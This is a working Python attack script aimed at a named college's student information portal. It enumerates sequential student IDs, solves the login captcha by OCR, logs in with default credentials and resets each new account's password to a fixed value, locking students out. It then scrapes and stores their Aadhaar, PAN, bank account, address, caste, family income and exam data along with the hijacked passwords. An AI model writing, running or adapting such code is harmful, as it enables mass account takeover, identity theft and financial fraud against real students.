import requests
import re
from bs4 import BeautifulSoup
import time
import sys
import io
import json
import os
from PIL import Image
import pytesseract
import cv2
import numpy as np
from datetime import datetime
import traceback
import logging

# Set up logging to both console and a file for the Flask stream
LOG_FILE = "automation_logs.txt"
if os.path.exists(LOG_FILE):
    os.remove(LOG_FILE) # Clear previous logs on startup

# Set up logging handler
def setup_file_logger():
    """Sets up a file handler for logging."""
    file_handler = logging.FileHandler(LOG_FILE, mode='a', encoding='utf-8')
    formatter = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    file_handler.setFormatter(formatter)
    
    # Create a custom logger that doesn't propagate to root (which prints to console)
    logger = logging.getLogger('automation_logger')
    logger.setLevel(logging.INFO)
    logger.addHandler(file_handler)
    return logger

class StudentPortalAutomation:
    def __init__(self):
        self.session = requests.Session()
        self.base_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,kn;q=0.6,mr;q=0.5,ar;q=0.4',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://pcacsmis.pillai.edu.in',
            'priority': 'u=0, i',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
        }
        
        # Initialize file paths first (Fixes AttributeError)
        self.credentials_file = "student_credentials.txt"
        self.json_file = "students_data.json"  
        self.logger = setup_file_logger()
        
        # Initialize data storage (uses the file path now)
        self.students_data = self.load_existing_data()
        
        # Set initial cookies
        self.session.cookies.update({
            'ASP.NET_SessionId': 'qnc5rfyofaqnwsdxmzkypkki',
            'perf_dv6Tr4n': '1',
            'TawkConnectionTime': '0',
        })

        # --- COMPREHENSIVE FIELD MAPPING ---
        self.field_map = {
            # Textbox Mappings (Input Type="text" or "password")
            'TextBox1': ('personal_details', 'Application Id'),
            'TextBox3': ('personal_details', 'Student Name'),   
            'TextBox5': ('personal_details', 'DOB'),
            'TextBox7': ('personal_details', 'Father Name'),    
            'TextBox6': ('personal_details', 'Mother Name'),    
            'TextBox19': ('personal_details', 'Email'),
            'TextBox18': ('personal_details', 'Contact No.'),
            'TextBox45': ('personal_details', 'Birth Place'),
            'TextBox10': ('personal_details', 'Birth District'),
            'TextBox11': ('personal_details', 'Blood Group'),
            
            # Address Details
            'TextBox82': ('personal_details', 'PermanentAddress'),
            'TextBox83': ('personal_details', 'CurrentAddress'),
            'TextBox84': ('personal_details', 'Permanent State'),
            'TextBox85': ('personal_details', 'Current State'),
            'TextBox50': ('personal_details', 'PermanentDistrict'),
            'TextBox40': ('personal_details', 'Current District'),
            'TextBox93': ('personal_details', 'Permanent Taluka'),
            'TextBox94': ('personal_details', 'Current Taluka'),
            'TextBox95': ('personal_details', 'Pin Code'),
            'TextBox22': ('personal_details', 'Permanent City / Village'),
            'TextBox25': ('personal_details', 'Current City / Village'),
            'TextBox26': ('personal_details', 'Mothertongue'),

            # Admission Details
            'TextBox52': ('admission_details', 'General Register Number'),
            'TextBox28': ('admission_details', 'Saral Id'),
            'TextBox41': ('admission_details', 'Admission Date'),
            'TextBox43': ('admission_details', 'Last Exam Seat Number'),
            'TextBox44': ('admission_details', 'Exam Month'),
            'TextBox49': ('admission_details', 'Candidate Type'),
            'TextBox75': ('admission_details', 'Academic Year'),
            'TextBox53': ('admission_details', 'Division'),
            'TextBox2': ('admission_details', 'Enrollment Number / PRN'), 
            'TextBox55': ('admission_details', 'Board Registration Amount'),
            'TextBox34': ('admission_details', 'Board Registration Number'),
            'TextBox32': ('admission_details', 'Board Registration Date'),

            # Parent Details
            'TextBox65': ('parent_details', 'Parent Name'),
            'TextBox66': ('parent_details', 'Parent Email'),
            'TextBox67': ('parent_details', 'Parent Contact'),
            'TextBox68': ('parent_details', 'Occupation'),
            'TextBox69': ('parent_details', 'Organization'),
            'TextBox70': ('parent_details', 'Designation'),
            'TextBox77': ('parent_details', 'Annual Income'), # Parent Annual Income

            # Guardian Details 
            'TextBox79': ('guardian_details', 'Guardian Name'),
            'TextBox78': ('guardian_details', 'Guardian Email'),
            'TextBox80': ('guardian_details', 'Guardian Contact'),
            'TextBox97': ('guardian_details', 'Occupation'), 
            'TextBox88': ('guardian_details', 'Organization'), 
            'TextBox89': ('guardian_details', 'Designation'), 
            'TextBox90': ('guardian_details', 'Guardian Address'),
            'TextBox91': ('guardian_details', 'Relation'),
            
            # Hostel Details 
            'TextBox73': ('hostel_details', 'Hostel Name'),
            'TextBox103': ('hostel_details', 'Room No.'),
            'TextBox104': ('hostel_details', 'Hostel Address'),
            
            # Bank Details 
            'TextBox15': ('bank_details', 'Bank Name'),
            'TextBox16': ('bank_details', 'Branch'),
            'TextBox17': ('bank_details', 'IFSC'),
            'TextBox24': ('bank_details', 'Account Number'),
            'TextBox27': ('bank_details', 'PAN'),
            'TextBox42': ('bank_details', 'AADHAAR'),
            
            # Mark Details 
            'TextBox57': ('mark_details', 'SSC %'),
            'TextBox59': ('mark_details', 'HSC %'),
            'TextBox58': ('mark_details', 'Diploma %'),
            'TextBox60': ('mark_details', 'CET Marks'),
            'TextBox61': ('mark_details', 'JEE Marks'),
            'TextBox62': ('mark_details', 'AIEEE Marks'),
            'TextBox63': ('mark_details', 'NEET Marks'),
            'TextBox106': ('mark_details', 'CAT Marks'),
            'TextBox74': ('mark_details', 'UG %'),
            'TextBox98': ('mark_details', 'PG %'), 
            'TextBox96': ('mark_details', 'Entrance Marks'), 

            # Other Details 
            'TextBox100': ('other_details', 'Admission Form Submitted'),
            'TextBox101': ('other_details', 'Voter Id'),
            'TextBox99': ('other_details', 'Institute Email'),
            'TextBox126': ('other_details', 'APAAR Id'),
            'TextBox128': ('other_details', 'PEN Id'),
            'TextBox129': ('other_details', 'ABC Id'),
            'TextBox4': ('other_details', 'Other Information'), 
            'TextBox81': ('other_details', 'Other 1'), 

            # Dropdown/Select Mappings 
            'DropDownList1': ('admission_details', 'Course Code'),
            'DropDownList2': ('admission_details', 'Course Name'),
            'DropDownList3': ('admission_details', 'Class'),
            'DropDownList4': ('admission_details', 'Roll Number'),
            'DropDownList5': ('admission_details', 'Batch'),
            'DropDownList6': ('admission_details', 'Enrollment Mode'),
            'DropDownList7': ('admission_details', 'Admission Type'),
            'DropDownList8': ('admission_details', 'Seat Type'),
            'DropDownList9': ('admission_details', 'Eligibility Id'),
            'DropDownList10': ('admission_details', 'Region'),
            'DropDownList11': ('admission_details', 'Home University'),
            'DropDownList12': ('admission_details', 'Institute code'),
            'DropDownList13': ('admission_details', 'Institute Name'),
            'DropDownList14': ('personal_details', 'Religion'),
            'DropDownList15': ('personal_details', 'Caste'),
            'DropDownList16': ('personal_details', 'Category'),
            'DropDownList17': ('personal_details', 'Nationality'),
            'DropDownList18': ('admission_details', 'Admission Status'),
            'DropDownList19': ('other_details', 'Minority'),
            'DropDownList20': ('other_details', 'Scholarship'),
            'RadioButtonList1': ('personal_details', 'Gender'),
            'DropDownListHostel': ('hostel_details', 'Hostel (Yes/No)'), 
            'DropDownListInactive': ('other_details', 'Is Inactive'), 
        }
        
        self.default_profile_structure = self._build_default_structure()

    def _build_default_structure(self):
        """Initializes the default nested dictionary structure to ensure all keys exist."""
        structure = {
            "personal_details": {},
            "admission_details": {},
            "parent_details": {},
            "guardian_details": {},
            "hostel_details": {},
            "bank_details": {},
            "mark_details": {},
            "other_details": {}
        }
        for section, field_name in self.field_map.values():
            if field_name not in structure[section]:
                structure[section][field_name] = ""
        
        structure["admission_details"]["UDISE"] = "" 
        
        return structure

    def load_existing_data(self):
        """Load existing student data from JSON file"""
        try:
            with open(self.json_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            return {"students": [], "last_updated": datetime.now().isoformat()}
        except json.JSONDecodeError:
            self.log_message(f"Could not decode JSON from {self.json_file}. File may be corrupted. Starting fresh.", "ERROR")
            return {"students": [], "last_updated": datetime.now().isoformat()}

    def save_student_data(self, student_id, student_name, password, profile_data):
        """Save student data to JSON file with detailed formatting"""
        student_entry = {
            "student_id": student_id,
            "student_name": student_name,
            "password": password,
            "profile_data": profile_data,
            "discovered_at": datetime.now().isoformat(),
            "image_url": f"https://pcacsmis.pillai.edu.in/studentinfosys/photopic/719_{student_id}.jpg"
        }
        
        existing_index = None
        for i, student in enumerate(self.students_data["students"]):
            if student["student_id"] == student_id:
                existing_index = i
                break
        
        if existing_index is not None:
            self.students_data["students"][existing_index] = student_entry
        else:
            self.students_data["students"].append(student_entry)
        
        self.students_data["last_updated"] = datetime.now().isoformat()
        
        with open(self.json_file, 'w', encoding='utf-8') as f:
            json.dump(self.students_data, f, indent=2, ensure_ascii=False, sort_keys=False)

    def save_credentials(self, student_id, student_name, password):
        """Save credentials to text file"""
        with open(self.credentials_file, 'a', encoding='utf-8') as f:
            f.write(f"{student_id} | {password} | {student_name}\n")

    def generate_student_id_sequential(self, start_from=0):
        """Generate sequential student IDs starting from 2024PC0000"""
        for i in range(start_from, 10000):
            yield f"2024PC{i:04d}"

    def log_message(self, message, level="INFO"):
        """Print formatted log messages to console and file"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        formatted_message = f"[{timestamp}] [{level}] {message}"
        print(formatted_message)
        if hasattr(self, 'logger'):
            if level == "ERROR":
                self.logger.error(message)
            elif level == "WARNING":
                self.logger.warning(message)
            else:
                self.logger.info(message)


    def extract_viewstate(self, html_content):
        """Extract VIEWSTATE, VIEWSTATEGENERATOR, and EVENTVALIDATION from HTML"""
        soup = BeautifulSoup(html_content, 'html.parser')
        viewstate = soup.find('input', {'name': '__VIEWSTATE'})
        viewstate_generator = soup.find('input', {'name': '__VIEWSTATEGENERATOR'})
        event_validation = soup.find('input', {'name': '__EVENTVALIDATION'})
        return {
            '__VIEWSTATE': viewstate.get('value') if viewstate else '',
            '__VIEWSTATEGENERATOR': viewstate_generator.get('value') if viewstate_generator else '',
            '__EVENTVALIDATION': event_validation.get('value') if event_validation else ''
        }

    # --- CAPTCHA/LOGIN/NAVIGATION (Simplified for brevity but kept functional) ---
    def download_captcha_image(self):
        captcha_url = "https://pcacsmis.pillai.edu.in/ImageHandler.ashx"
        try:
            response = self.session.get(captcha_url, stream=True)
            return response.content if response.status_code == 200 else None
        except Exception: return None

    def preprocess_captcha_image(self, image_data):
        try:
            image = Image.open(io.BytesIO(image_data))
            img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)
            kernel = np.ones((2,2), np.uint8)
            processed = cv2.morphologyEx(thresh, cv2.MORPH_CLOSE, kernel)
            return Image.fromarray(processed)
        except Exception: return Image.open(io.BytesIO(image_data))

    def solve_math_captcha(self, image_data):
        try:
            processed_image = self.preprocess_captcha_image(image_data)
            custom_config = r'--oem 3 --psm 8 -c tessedit_char_whitelist=0123456789+-x='
            text = pytesseract.image_to_string(processed_image, config=custom_config)
            cleaned_text = re.sub(r'[^\d+\-x=]', '', text.strip())
            expression = cleaned_text.split('=')[0].replace('x', '*')
            if re.match(r'^[\d+\-*()/\s]+$', expression):
                return str(eval(expression))
            return None
        except Exception: return None

    def manual_captcha_fallback(self):
        self.log_message("OCR failed. Please manually solve the captcha.", "WARNING")
        captcha_data = self.download_captcha_image()
        if captcha_data:
            with open("captcha_manual.jpg", "wb") as f: f.write(captcha_data)
            self.log_message("Captcha saved as 'captcha_manual.jpg'.")
        manual_solution = input("Please enter the captcha solution manually: ")
        return manual_solution.strip()

    def get_captcha_solution(self):
        captcha_data = self.download_captcha_image()
        if not captcha_data: return self.manual_captcha_fallback()
        solution = self.solve_math_captcha(captcha_data)
        if solution:
            self.log_message(f"Automatically solved captcha: {solution}", "SUCCESS")
            return solution
        else:
            return self.manual_captcha_fallback()

    def is_password_reset_page(self, response_text):
        # We need the response object to check its text content
        return "studinfo_generatepwc.aspx" in response_text

    def is_successful_login(self, response_text):
        soup = BeautifulSoup(response_text, 'html.parser')
        welcome_span = soup.find('span', {'class': 'style8'})
        
        if welcome_span and "Welcome" in welcome_span.text:
            name_span = soup.find('span', {'id': 'MainContent_Label14'})
            student_name = name_span.text.strip() if name_span else "Name Unknown"
            return True, student_name
        return False, None

    def analyze_response(self, response_text, step_name):
        # Placeholder for analysis, removed verbose logging to keep file lean
        pass

    def reset_password(self, student_id, instid=None):
        self.log_message(f"Starting password reset process for {student_id}")
        reset_url = 'https://pcacsmis.pillai.edu.in/studentinfosys/studentportal/studinfo_generatepwc.aspx'
        params = {'Instid': instid} if instid else {}
        headers = self.base_headers.copy()
        headers['referer'] = f'https://pcacsmis.pillai.edu.in/studentinfosys/studentportal/studinfo_generatepwc.aspx?Instid={instid}' if instid else reset_url
        response = self.session.get(reset_url, params=params, headers=headers)
        form_data = self.extract_viewstate(response.text)
        
        form_data.update({
            'ctl00$MainContent$TextBox1': 'Prachi@1419',
            'ctl00$MainContent$TextBox2': 'Prachi@1419',
            'ctl00$MainContent$Button2': 'Submit',
        })
        response = self.session.post(reset_url, params=params, headers=headers, data=form_data)
        success_indicators = ["password has been updated successfully", "successfully"]
        success = any(indicator.lower() in response.text.lower() for indicator in success_indicators)
        return success

    def attempt_initial_login(self, student_id):
        login_url = 'https://pcacsmis.pillai.edu.in/studentinfosys/studentportal/studinfo_studlogin.aspx'
        response = self.session.get(login_url, headers=self.base_headers)
        form_data = self.extract_viewstate(response.text)
        captcha_solution = self.get_captcha_solution()
        if not captcha_solution: return None
        form_data.update({
            'ctl00$MainContent$TextBox1': '719', 'ctl00$MainContent$TextBox2': student_id,  
            'ctl00$MainContent$TextBox3': student_id,  'ctl00$MainContent$TextBox64': captcha_solution,  
            'ctl00$MainContent$Button1': 'Login', '__EVENTTARGET': '', '__EVENTARGUMENT': '',
        })
        return self.session.post(login_url, headers=self.base_headers, data=form_data)

    def attempt_final_login(self, student_id, password):
        login_url = 'https://pcacsmis.pillai.edu.in/studentinfosys/studentportal/studinfo_studlogin.aspx'
        response = self.session.get(login_url, headers=self.base_headers)
        form_data = self.extract_viewstate(response.text)
        captcha_solution = self.get_captcha_solution()
        if not captcha_solution: return None
        form_data.update({
            'ctl00$MainContent$TextBox1': '719', 'ctl00$MainContent$TextBox2': student_id,
            'ctl00$MainContent$TextBox3': password,  'ctl00$MainContent$TextBox64': captcha_solution,  
            'ctl00$MainContent$Button1': 'Login', '__EVENTTARGET': '', '__EVENTARGUMENT': '',
        })
        return self.session.post(login_url, headers=self.base_headers, data=form_data)

    def navigate_to_profile_page(self, instid):
        home_url = 'https://pcacsmis.pillai.edu.in/studentinfosys/studentportal/studinfo_studhome.aspx'
        profile_url = 'https://pcacsmis.pillai.edu.in/studentinfosys/studentportal/studinfo_studeditprofile.aspx'
        headers = self.base_headers.copy()
        headers['referer'] = f'{home_url}?Instid={instid}'
        response = self.session.get(f'{home_url}?Instid={instid}', headers=headers)
        form_data = self.extract_viewstate(response.text)
        form_data.update({'__EVENTTARGET': 'ctl00$MainContent$LinkButton14', '__EVENTARGUMENT': ''})
        response = self.session.post(f'{home_url}?Instid={instid}', headers=headers, data=form_data, allow_redirects=True)
        return response if 'studinfo_studeditprofile.aspx' in response.url else self.session.get(f'{profile_url}?Instid={instid}', headers=headers)


    def extract_student_details(self, instid, student_id):
        """Extract comprehensive student details from profile page with robust field mapping."""
        self.log_message(f"Extracting details for {student_id}", "INFO")
        
        try:
            response = self.navigate_to_profile_page(instid)
            soup = BeautifulSoup(response.text, 'html.parser')
            profile_data = json.loads(json.dumps(self.default_profile_structure)) 
            
            # --- 1. Extract Input Field Values (Textboxes) ---
            for input_field in soup.find_all('input'):
                field_name = input_field.get('name', '')
                field_value = input_field.get('value', '').strip()
                
                if not field_name.startswith('ctl00$MainContent$') or not field_value:
                    continue
                
                match = re.search(r'(TextBox\d+)', field_name)
                if match:
                    generic_id = match.group(1)
                    if generic_id in self.field_map:
                        section, final_key = self.field_map[generic_id]
                        profile_data[section][final_key] = field_value
            
            # --- 2. Extract Dropdown/Select Values ---
            for select_field in soup.find_all('select'):
                field_name = select_field.get('name', '')
                match = re.search(r'(DropDownList\d+|RadioButtonList\d+|DropDownListHostel|DropDownListInactive)', field_name)
                
                if match:
                    generic_id = match.group(1)
                    if generic_id in self.field_map:
                        selected_option = select_field.find('option', selected=True)
                        if selected_option and selected_option.text.strip() and selected_option.text.strip().lower() != 'select':
                            value = selected_option.text.strip()
                            section, final_key = self.field_map[generic_id]
                            profile_data[section][final_key] = value

            # --- 3. Special Handling: Radio Buttons (Gender) - Primary check ---
            gender_radio = soup.find('input', {'name': 'ctl00$MainContent$RadioButtonList1', 'checked': True})
            if gender_radio:
                gender_val = gender_radio.get('value', '').strip()
                if gender_val == 'M' or gender_val == 'Male':
                    profile_data["personal_details"]['Gender'] = 'Male'
                elif gender_val == 'F' or gender_val == 'Female':
                    profile_data["personal_details"]['Gender'] = 'Female'
            
            # --- 4. Special Handling: Textareas (for multi-line fields) ---
            textarea_map = {
                'ctl00$MainContent$TextBox76': ('parent_details', 'Parent Address'), 
                'ctl00$MainContent$TextBox104': ('hostel_details', 'Hostel Address'), 
                'ctl00$MainContent$TextBox4': ('other_details', 'Other Information') 
            }
            for textarea in soup.find_all('textarea'):
                field_name = textarea.get('name', '')
                field_value = textarea.string.strip() if textarea.string else ''
                if field_name in textarea_map and field_value:
                    section, final_key = textarea_map[field_name]
                    profile_data[section][final_key] = field_value


            # --- 5. Final Clean-up and Structure ---
            final_data = {}
            for section in self.default_profile_structure:
                final_data[section] = {}
                for key, default_value in self.default_profile_structure[section].items():
                    value = profile_data.get(section, {}).get(key)
                    if value is not None:
                        final_data[section][key] = value.strip()
                    else:
                        final_data[section][key] = ""

            return final_data
            
        except Exception as e:
            self.log_message(f"Error extracting student details: {str(e)}", "ERROR")
            self.log_message(f"Traceback: {traceback.format_exc()}", "ERROR")
            return json.loads(json.dumps(self.default_profile_structure))

    def process_student_id(self, student_id, password="Prachi@1419"):
        """Complete processing for a single student ID"""
        self.log_message(f"🚀 STARTING PROCESS FOR STUDENT ID: {student_id}", "PROCESS")
        
        # Phase 1: Initial login with ID as both username and password
        self.log_message("=== PHASE 1: INITIAL LOGIN ===")
        
        # FIX: Initialize response to None before the attempt
        response = self.attempt_initial_login(student_id)
        
        if response is None:
            self.log_message("❌ Initial login failed due to captcha error or connection issue", "ERROR")
            return False, None, student_id, None
        
        # Check if we got redirected to password reset page
        if self.is_password_reset_page(response.text):
            self.log_message("✅ Redirected to password reset page as expected", "SUCCESS")
            
            instid_match = re.search(r'Instid=([^"&]+)', response.text)
            instid = instid_match.group(1) if instid_match else None
            self.log_message(f"Extracted Instid: {instid}")
            
            # Phase 2: Password reset
            self.log_message("=== PHASE 2: PASSWORD RESET ===")
            reset_success = self.reset_password(student_id, instid)
            
            if reset_success:
                time.sleep(2)
                
                # Phase 3: Final login with new password
                self.log_message("=== PHASE 3: FINAL LOGIN WITH NEW PASSWORD ===")
                response = self.attempt_final_login(student_id, password)
                
                if response is None:
                    self.log_message("❌ Final login failed due to captcha error or connection issue", "ERROR")
                    return False, None, student_id, None
                
                instid_match = re.search(r'Instid=([^"&]+)', response.text)
                instid = instid_match.group(1) if instid_match else None
                
                success, student_name = self.is_successful_login(response.text)
                if success and instid:
                    # Phase 4: Extract student details
                    self.log_message("=== PHASE 4: EXTRACTING STUDENT DETAILS ===")
                    student_details = self.extract_student_details(instid, student_id)
                    
                    self.save_credentials(student_id, student_name, password)
                    self.save_student_data(student_id, student_name, password, student_details)
                    
                    self.log_message(f"🎉 COMPLETE SUCCESS! Account accessible: {student_name}", "SUCCESS")
                    return True, student_name, student_id, student_details
                else:
                    self.log_message("❌ Final login failed after password reset", "ERROR")
                    return False, None, student_id, None
            else:
                self.log_message("❌ Password reset failed", "ERROR")
                return False, None, student_id, None
        else:
            # Check if initial login was actually successful
            success, student_name = self.is_successful_login(response.text)
            if success:
                instid_match = re.search(r'Instid=([^"&]+)', response.text)
                instid = instid_match.group(1) if instid_match else None
                
                student_details = {}
                if instid:
                    student_details = self.extract_student_details(instid, student_id)
                
                self.save_credentials(student_id, student_name, student_id)
                self.save_student_data(student_id, student_name, student_id, student_details)
                
                self.log_message(f"🎉 DIRECT LOGIN SUCCESS! No password reset needed: {student_name}", "SUCCESS")
                return True, student_name, student_id, student_details
            else:
                self.log_message("❌ Initial login failed - account may not exist or wrong captcha/credentials", "ERROR")
                return False, None, student_id, None

    def run_automation(self, start_from=0, max_attempts=10000):
        self.log_message(f"🚀 STARTING STUDENT PORTAL AUTOMATION", "START")
        successful_logins = []
        student_id_generator = self.generate_student_id_sequential(start_from)
        
        for attempt in range(1, max_attempts + 1):
            student_id = next(student_id_generator)
            
            if any(student['student_id'] == student_id for student in self.students_data["students"]):
                self.log_message(f"⏩ Skipping ID {student_id} - Already processed.", "SKIP")
                continue

            self.log_message(f"📊 ATTEMPT {attempt}/{max_attempts} - ID: {student_id}", "ATTEMPT")
            self.log_message("-" * 50)
            
            try:
                success, student_name, used_id, student_details = self.process_student_id(student_id)
                
                if success:
                    successful_logins.append({
                        'student_id': used_id,
                        'student_name': student_name,
                        'details': student_details
                    })
                    self.log_message(f"✅ Saved data for: {student_name} ({used_id})", "SUCCESS")
            except Exception as e:
                # Log exceptions in the main loop to the file
                self.log_message(f"❌ Exception occurred: {str(e)}", "ERROR")
                continue
            
            self.log_message(f"⏳ Waiting 3 seconds before next attempt...")
            time.sleep(3)
            
            if attempt % 10 == 0:
                self.log_message(f"💾 Progress saved after {attempt} attempts")
        
        self.log_message("🏁 AUTOMATION COMPLETED", "COMPLETE")
        return successful_logins

# Installation instructions
def check_dependencies():
    required_packages = {'requests': 'requests', 'beautifulsoup4': 'bs4', 'Pillow': 'PIL', 
                         'pytesseract': 'pytesseract', 'opencv-python': 'cv2', 'numpy': 'numpy'}
    print("🔍 Checking dependencies...")
    for package, import_name in required_packages.items():
        try:
            if import_name == 'PIL': __import__('PIL.Image')
            else: __import__(import_name)
            print(f"✓ {package} is installed")
        except ImportError:
            print(f"❌ {package} is not installed. Install with: pip install {package}")
    
    print("\n📋 Ensure Tesseract OCR is installed on your system.")

def main():
    print("🎓 Captcha-Solving Student Portal Automation")
    print("=" * 60)
    
    check_dependencies()
    print("\n" + "=" * 60)
    
    start_from = input("Enter starting ID number (0-9999, default 0): ").strip()
    try:
        start_from = int(start_from) if start_from else 0
        if start_from < 0 or start_from > 9999: raise ValueError
    except ValueError:
        print("Invalid input. Starting from 0.")
        start_from = 0
    
    max_attempts = input("Enter number of attempts (default 100): ").strip()
    try:
        max_attempts = int(max_attempts) if max_attempts else 100
    except ValueError:
        print("Invalid input. Using default 100.")
        max_attempts = 100
    
    automator = StudentPortalAutomation()
    
    try:
        print(f"\n🎯 Starting automation from 2024PC{start_from:04d} for {max_attempts} attempts...")
        input("Press Enter to continue or Ctrl+C to cancel...")
        
        automator.run_automation(start_from=start_from, max_attempts=max_attempts)
        
        print(f"\n🎊 Automation completed!")
        print(f"📊 Run the Flask server (`python app.py`) and open your browser to view the dashboard.")
            
    except KeyboardInterrupt:
        print("\n\n⚠️ Script interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Unexpected error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
